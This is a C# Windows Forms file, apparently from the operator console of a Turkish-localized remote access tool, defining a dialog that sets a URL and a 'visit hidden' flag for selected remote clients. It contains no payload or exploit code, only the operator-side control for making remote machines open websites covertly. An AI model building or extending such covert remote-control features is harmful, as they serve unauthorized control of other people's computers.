using System;
using System.Windows.Forms;
using xServer.KuuhakuCekirdek.Veri;
using xServer.KuuhakuCekirdek.Yardımcılar;

namespace xServer.Formlar
{
    public partial class FrmWebsitesiZiyaret : Form
    {
        private readonly int _selectedClients;

        public FrmWebsitesiZiyaret(int selected)
        {
            _selectedClients = selected;
            InitializeComponent();
        }

        private void FrmVisitWebsite_Load(object sender, EventArgs e)
        {
            Text = PencereYardımcısı.GetWindowTitle("Websitesi Ziyaret Et", _selectedClients);
            txtURL.Text = WebsiteZiyareti.URL;
            chkVisitHidden.Checked = WebsiteZiyareti.Hidden;
        }

        private void btnWebsiteZiyareti_Click(object sender, EventArgs e)
        {
            WebsiteZiyareti.URL = txtURL.Text;
            WebsiteZiyareti.Hidden = chkVisitHidden.Checked;

            DialogResult = DialogResult.OK;
            Close();
        }
    }
}